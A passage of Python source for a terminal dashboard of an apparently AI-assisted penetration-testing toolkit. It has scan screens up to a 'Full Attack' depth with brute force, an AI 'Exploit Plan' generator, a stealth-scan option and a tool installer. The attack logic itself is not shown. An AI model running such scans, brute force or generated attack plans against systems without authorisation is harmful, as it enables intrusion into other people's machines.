   ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░        ░ ░ ░ ▒    ░░   ░    ░
       ░  ░   ░                  ░ ░  ░ ░          ░ ░     ░        ░  ░
[/dim]
[cyan bold]  AUTOCORE v4.0[/cyan bold] [dim]|[/dim] [white]AI-Powered Pentest Toolkit[/white]
[dim]  Author: Ch Manan (OBLIQ_CORE) | cynex | github.com/Abdul-Manan-C[/dim]

  [dim]Platform:[/dim] [yellow]{os_name}[/yellow]  [dim]AI:[/dim] {ai_status}  [dim]Sessions:[/dim] [cyan]{sessions}[/cyan]

  [dim]Press [/dim][cyan]S[/cyan][dim] to start a scan · [/dim][cyan]A[/cyan][dim] for AI tools · [/dim][cyan]?[/cyan][dim] for help[/dim]
"""

# ── Scan Screen ───────────────────────────────────────────────────────
class ScanScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]

    def __init__(self):
        super().__init__()
        self._scanner: Optional[Scanner] = None
        self._session: Optional[Session] = None
        self._thread: Optional[threading.Thread] = None

    def compose(self) -> ComposeResult:
        yield Static("[cyan bold]NEW SCAN[/cyan bold]", classes="panel-title")
        yield Input(placeholder="Target IP or hostname (e.g. 192.168.1.1)", id="target-input")
        yield Static("\n[white]Scan Depth:[/white]")
        yield RadioSet(
            RadioButton("1 — Recon Only       (~1 min)",  id="d1"),
            RadioButton("2 — Port Discovery   (~3 min)",  id="d2"),
            RadioButton("3 — Full Ports       (~10 min)", id="d3"),
            RadioButton("4 — Deep Enum        (~20 min)", id="d4", value=True),
            RadioButton("5 — Full Attack      (~40 min)", id="d5"),
            id="depth-radio"
        )
        with Horizontal():
            yield Button("▶  Start Scan", id="btn-start", variant="primary")
            yield Button("■  Stop",       id="btn-stop",  variant="error")
        yield RichLog(id="scan-log", highlight=True, markup=True, wrap=True)

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "btn-start":
            target = self.query_one("#target-input", Input).value.strip()
            if not target:
                self._log("[red]  ✘ Please enter a target[/red]"); return
            depth = self._get_depth()
            self._start_scan(target, depth)
        elif event.button.id == "btn-stop":
            if self._scanner: self._scanner.stop()
            self._log("[yellow]  ! Scan stopped by user[/yellow]")

    def _get_depth(self) -> int:
        rs = self.query_one("#depth-radio", RadioSet)
        selected = rs.pressed_index
        return selected + 1 if selected is not None else 4

    def _log(self, msg: str):
        log = self.query_one("#scan-log", RichLog)
        log.write(msg)

    def _start_scan(self, target: str, depth: int):
        self._log(f"[cyan]  → Starting scan: {target} (depth {depth})[/cyan]")
        self._session = Session(target)
        self._scanner = Scanner(self._session, output_fn=self._log)

        def run():
            self._scanner.run(depth=depth)

        self._thread = threading.Thread(target=run, daemon=True)
        self._thread.start()

# ── AI Screen ─────────────────────────────────────────────────────────
class AIScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]

    def __init__(self):
        super().__init__()
        self._history: list[dict] = []
        self._session_findings: dict = {}

    def compose(self) -> ComposeResult:
        ai_str = AI.backend.upper() if AI.backend != "none" else "NO AI CONFIGURED"
        yield Static(f"[cyan bold]AI TOOLS[/cyan bold]  [dim]Backend: {ai_str}[/dim]",
                     classes="panel-title")
        with TabbedContent():
            with TabPane("💬 Chat", id="tab-chat"):
                yield RichLog(id="chat-log", highlight=True, markup=True, wrap=True)
                with Horizontal():
                    yield Input(placeholder="Ask anything about security...", id="chat-input")
                    yield Button("Send", id="btn-send", variant="primary")
            with TabPane("🔍 Analyze Last Scan", id="tab-analyze"):
                yield Button("Run AI Analysis on Last Session", id="btn-analyze", variant="primary")
                yield RichLog(id="analyze-log", highlight=True, markup=True, wrap=True)
            with TabPane("💣 Exploit Plan", id="tab-exploit"):
                yield Button("Generate Attack Plan for Last Session", id="btn-exploit", variant="primary")
                yield RichLog(id="exploit-log", highlight=True, markup=True, wrap=True)

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "btn-send":
            self._send_chat()
        elif event.button.id == "btn-analyze":
            self._run_analyze()
        elif event.button.id == "btn-exploit":
            self._run_exploit()

    def on_input_submitted(self, event: Input.Submitted):
        if event.input.id == "chat-input":
            self._send_chat()

    def _send_chat(self):
        inp = self.query_one("#chat-input", Input)
        log = self.query_one("#chat-log", RichLog)
        msg = inp.value.strip()
        if not msg: return
        inp.value = ""
        log.write(f"[cyan bold]You:[/cyan bold] {escape(msg)}")
        self._history.append({"role":"user","content": msg})
        context = ""
        if self._session_findings:
            context = f"\nCurrent session findings: {json.dumps(self._session_findings, indent=2)[:2000]}\n\n"
        def ask():
            full_prompt = context + "\n".join(
                f"{'User' if h['role']=='user' else 'Assistant'}: {h['content']}"
                for h in self._history[-6:]
            )
            resp = AI.ask(full_prompt)
            self._history.append({"role":"assistant","content":resp})
            log.write(f"[green bold]AI:[/green bold] {escape(resp)}\n")
        threading.Thread(target=ask, daemon=True).start()

    def _run_analyze(self):
        log = self.query_one("#analyze-log", RichLog)
        findings = self._get_last_findings()
        if not findings:
            log.write("[yellow]No recent session found.[/yellow]"); return
        log.write("[cyan]  → Analyzing with AI...[/cyan]")
        def go():
            r = AI.analyze_scan(findings)
            log.write(escape(r))
        threading.Thread(target=go, daemon=True).start()

    def _run_exploit(self):
        log = self.query_one("#exploit-log", RichLog)
        findings = self._get_last_findings()
        if not findings:
            log.write("[yellow]No recent session found.[/yellow]"); return
        log.write("[cyan]  → Generating attack plan...[/cyan]")
        def go():
            r = AI.generate_exploit_plan(findings)
            log.write(escape(r))
        threading.Thread(target=go, daemon=True).start()

    def _get_last_findings(self) -> dict:
        sessions = list_sessions()
        if not sessions: return {}
        last = sessions[0]
        rpt = Path(last["path"]) / f"REPORT_{last['target']}.json"
        if rpt.exists():
            try: return json.loads(rpt.read_text())
            except Exception: pass
        return {"target": last["target"]}

# ── Sessions Screen ───────────────────────────────────────────────────
class SessionsScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]

    def compose(self) -> ComposeResult:
        yield Static("[cyan bold]PAST SESSIONS[/cyan bold]", classes="panel-title")
        sessions = list_sessions()
        if not sessions:
            yield Static("[dim]  No sessions found.[/dim]")
            return
        with ScrollableContainer():
            for s in sessions:
                icon = "✔" if s["has_report"] else "○"
                yield Static(
                    f"[cyan]{icon}[/cyan] [white]{s['target']}[/white]  [dim]{s['ts']}[/dim]  "
                    f"[blue]{s['name']}[/blue]",
                    classes="nav-item"
                )
        yield Static("")
        yield Button("🗑  Clear All Sessions", id="btn-clear", variant="error")

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "btn-clear":
            base = Path(load_config().get("sessions_dir", str(SESSIONS_DIR)))
            for d in base.iterdir():
                if d.is_dir() and d.name.startswith("autocore_"):
                    shutil.rmtree(d, ignore_errors=True)
            self.app.pop_screen()

# ── Installer Screen ──────────────────────────────────────────────────
class InstallerScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]

    def compose(self) -> ComposeResult:
        yield Static("[cyan bold]TOOL INSTALLER[/cyan bold]", classes="panel-title")
        yield Button("▶  Install All Tools", id="btn-install", variant="primary")
        yield RichLog(id="install-log", highlight=True, markup=True, wrap=True)

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "btn-install":
            log = self.query_one("#install-log", RichLog)
            log.write("[cyan]  → Checking and installing tools...[/cyan]\n")
            def go():
                ok_count = fail_count = 0
                for name, methods in TOOLS.items():
                    if shutil.which(name):
                        log.write(f"[green]  ✔ {name:<15} already installed[/green]")
                        ok_count += 1
                    else:
                        log.write(f"[yellow]  ! {name:<15} missing — installing...[/yellow]")
                        success = install_tool(name, methods, lambda m: log.write(f"[dim]{escape(m)}[/dim]"))
                        if success:
                            log.write(f"[green]  ✔ {name:<15} installed[/green]"); ok_count += 1
                        else:
                            log.write(f"[red]  ✘ {name:<15} failed — all methods exhausted[/red]"); fail_count += 1
                log.write(f"\n[white]Complete: [green]{ok_count} installed[/green] · [red]{fail_count} failed[/red][/white]")
            threading.Thread(target=go, daemon=True).start()

# ── Settings Screen ───────────────────────────────────────────────────
class SettingsScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]

    def compose(self) -> ComposeResult:
        cfg = load_config()
        yield Static("[cyan bold]SETTINGS[/cyan bold]", classes="panel-title")
        yield Static("[dim]Gemini API Key[/dim]")
        yield Input(value=cfg.get("gemini_api_key",""),   placeholder="AIza...", id="gemini-key",    password=True)
        yield Static("[dim]OpenAI API Key[/dim]")
        yield Input(value=cfg.get("openai_api_key",""),   placeholder="sk-...",  id="openai-key",    password=True)
        yield Static("[dim]Ollama URL[/dim]")
        yield Input(value=cfg.get("ollama_url","http://localhost:11434"), id="ollama-url")
        yield Static("[dim]Ollama Model[/dim]")
        yield Input(value=cfg.get("ollama_model","llama3"), id="ollama-model")
        yield Static("[dim]Wordlist Directory[/dim]")
        yield Input(value=cfg.get("wordlist_dir",OS_INFO["wl_dir"]), id="wl-dir")
        yield Button("💾  Save Settings", id="btn-save", variant="primary")
        yield Static("", id="save-msg")

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id == "btn-save":
            cfg = load_config()
            cfg["gemini_api_key"] = self.query_one("#gemini-key",  Input).value.strip()
            cfg["openai_api_key"] = self.query_one("#openai-key",  Input).value.strip()
            cfg["ollama_url"]     = self.query_one("#ollama-url",  Input).value.strip()
            cfg["ollama_model"]   = self.query_one("#ollama-model",Input).value.strip()
            cfg["wordlist_dir"]   = self.query_one("#wl-dir",      Input).value.strip()
            save_config(cfg)
            # Re-detect AI
            global AI
            AI = AIBackend()
            self.query_one("#save-msg", Static).update(
                f"[green]  ✔ Saved! AI backend: {AI.backend.upper()}[/green]"
            )

# ── Help Screen ───────────────────────────────────────────────────────
class HelpScreen(Screen):
    BINDINGS = [("escape", "app.pop_screen", "Back")]
    def compose(self) -> ComposeResult:
        yield Static("[cyan bold]HELP[/cyan bold]", classes="panel-title")
        yield Static("""
[white]Navigation[/white]
  Arrow keys / mouse — navigate menus
  Enter              — select
  ESC                — go back

[white]CLI Usage[/white]
  autocore                    → launch TUI
  autocore <IP>               → full scan (depth 4)
  autocore <IP> --depth 1-5   → specific depth
  autocore <IP> --web         → web phase only
  autocore <IP> --smb         → smb phase only
  autocore <IP> --brute       → brute force only
  autocore <IP> --quick       → top 1000 ports
  autocore <IP> --stealth     → slow/quiet scan
  autocore --setup            → install all tools
  autocore --sessions         → list sessions
  autocore --clear            → delete sessions
  autocore --uninstall        → remove autocore

[white]AI Modes[/white]
  Ollama (local) → detected automatically if running
  Gemini / OpenAI → add API key in Settings

[white]Scan Depths[/white]
  1 = Recon only
  2 = Port discovery
  3 = Full ports + service detection
  4 = Deep enum (web, smb, vulns, CVEs, AI)
  5 = Full attack (all phases + brute force)

[white]Author[/white]
  Ch Manan (OBLIQ_CORE) | cynex
  github.com/Abdul-Manan-C
""")

# ══════════════════════════════════════════════════════════════════════
# MAIN APP
# ══════════════════════════════════════════════════════════════════════
class AutocoreApp(App):
    CSS = CSS
    TITLE = "AUTOCORE v4.0"
    BINDINGS = [
        Binding("q",     "quit",           "Quit"),
        Binding("s",     "go_scan",        "Scan"),
        Binding("a",     "go_ai",          "AI"),
        Binding("e",     "go_sessions",    "Sessions"),
        Binding("i",     "go_installer",   "Installer"),
        Binding("comma", "go_settings",    "Settings"),
        Binding("question_mark", "go_help","Help"),
    ]

    def compose(self) -> ComposeResult:
        with Horizontal():
            with Vertical(id="sidebar"):
                yield Static("[red bold] AUTOCORE[/red bold]", classes="nav-item")
                yield Static("[dim] v4.0 · cynex[/dim]", classes="nav-item")
                yield Static("─" * 20, classes="nav-sep")
                yield Static(" [cyan]S[/cyan] New Scan",       classes="nav-item")
                yield Static(" [cyan]A[/cyan] AI Tools",       classes="nav-item")
                yield Static(" [cyan]E[/cyan] Sessions",       classes="nav-item")
                yield Static(" [cyan]I[/cyan] Installer",      classes="nav-item")
                yield Static(" [cyan],[/cyan] Settings",       classes="nav-item")
                yield Static(" [cyan]?[/cyan] Help",           classes="nav-item")
                yield Static("─" * 20, classes="nav-sep")
                yield Static(f" [dim]OS: {OS_INFO['name'].upper()}[/dim]", classes="nav-item")
                ai_color = "green" if AI.backend != "none" else "red"
                yield Static(f" [{ai_color}]AI: {AI.backend.upper()}[/{ai_color}]", classes="nav-item")
                yield Static("─" * 20, classes="nav-sep")
                yield Static(" [red]Q[/red] Quit", classes="nav-item")
            with Vertical(id="main"):
                yield HomeScreen()

    def action_go_scan(self):     self.push_screen(ScanScreen())
    def action_go_ai(self):       self.push_screen(AIScreen())
    def action_go_sessions(self): self.push_screen(SessionsScreen())
    def action_go_installer(self):self.push_screen(InstallerScreen())
    def action_go_settings(self): self.push_screen(SettingsScreen())
    def action_go_help(self):     self.push_screen(HelpScreen())

# ══════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
def cli_scan(target: str, depth: int = 4, phases: list = None):
    """Run scan in plain Rich mode (no TUI)"""
    console.print(Panel.fit(
        f"[cyan bold]AUTOCORE v4.0[/cyan bold]  Target: [white]{target}[/white]  Depth: [yellow]{depth}[/yellow]",
        border_style="cyan"
    ))
    session = Session(target)
    def out(msg): console.print(msg)
    scanner = Scanner(session, output_fn=out)
    scanner.run(depth=depth, phases=phases)

def self_install():
    src = os.path.realpath(__file__)
    if OS_INFO.get("mobile"):
        dst = f"{os.environ.get('PREFIX','/usr/local')}/bin/autocore"
    else:
        dst = "/usr/local/bin/autocore"
    sp = "sudo " if OS_INFO["sudo"] else ""
    os.system(f"{sp}cp {src} {dst} && {sp}chmod +x {dst}")
    console.print(f"[green]✔ Installed → {dst}[/green]")
    console.print("[green]✔ Run: autocore[/green]")

def uninstall():
    for p in ["/usr/local/bin/autocore", "/usr/bin/autocore",
              f"{os.environ.get('PREFIX','')}/bin/autocore"]:
        if os.path.exists(p):
            sp = "sudo " if OS_INFO["sudo"] else ""
            os.system(f"{sp}rm -f {p}")
            console.print(f"[green]✔ Removed {p}[/green]")
    console.print("[green]✔ AUTOCORE removed. System tools untouched.[/green]")

def main():
    args = sys.argv[1:]

    if not args:
        app = AutocoreApp()
        app.run()
        return

    if args[0] == "--setup":
        console.print("[cyan]Installing tools...[/cyan]")
        for name, methods in TOOLS.items():
            if shutil.which(name):
                console.print(f"[green]✔ {name} already installed[/green]")
            else:
                console.print(f"[yellow]! Installing {name}...[/yellow]")
                ok = install_tool(name, methods, lambda m: console.print(f"[dim]{m}[/dim]"))
                console.print(f"[green]✔ {name}[/green]" if ok else f"[red]✘ {name} failed[/red]")
        return

    if args[0] == "--install":   self_install(); return
    if args[0] == "--uninstall": uninstall(); return

    if args[0] == "--sessions":
        sessions = list_sessions()
        if not sessions: console.print("[dim]No sessions.[/dim]"); return
        t = Table(title="Past Sessions", border_style="cyan")
        t.add_column("Target"); t.add_column("Timestamp"); t.add_column("Report")
        for s in sessions:
            t.add_row(s["target"], s["ts"], "✔" if s["has_report"] else "—")
        console.print(t)
        return

    if args[0] == "--clear":
        base = Path(load_config().get("sessions_dir", str(SESSIONS_DIR)))
        for d in base.iterdir():
            if d.is_dir() and d.name.startswith("autocore_"):
                shutil.rmtree(d, ignore_errors=True)
        console.print("[green]✔ Sessions cleared.[/green]")
        return

    if args[0] == "--help" or args[0] == "-h":
        console.print("""[cyan bold]AUTOCORE v4.0[/cyan bold]
  autocore                  → TUI dashboard
  autocore <IP>             → full scan
  autocore <IP> --depth N   → scan depth 1-5
  autocore <IP> --web       → web only
  autocore <IP> --smb       → smb only
  autocore <IP> --brute     → brute only
  autocore <IP> --quick     → top 1000 ports
  autocore <IP> --stealth   → slow scan
  autocore --setup          → install tools
  autocore --install        → add to PATH
  autocore --uninstall      → remove
  autocore --sessions       → list sessions
  autocore --clear          → delete sessions""")
        return

    # Target provided
    if not args[0].startswith("-"):
        target = args[0]
        depth  = 4
        phases = None

        for i, a in enumerate(args[1:], 1):
            if a == "--depth" and i+1 < len(args):
                try: depth = int(args[i+1])
                except: pass
            elif a == "--web":     phases = ["recon","nmap","web"]
            elif a == "--smb":     phases = ["recon","nmap","smb"]
            elif a == "--brute":   phases = ["recon","nmap","brute"]
            elif a == "--quick":   depth  = 2
            elif a == "--stealth":
                depth = 4
                OS_INFO["scan"] = OS_INFO["scan"].replace("-T4","-T2")

        cli_scan(target, depth, phases)
        return

    console.print(f"[red]Unknown option: {args[0]}. Try --help[/red]")

if __name__ == "__main__":
    main()
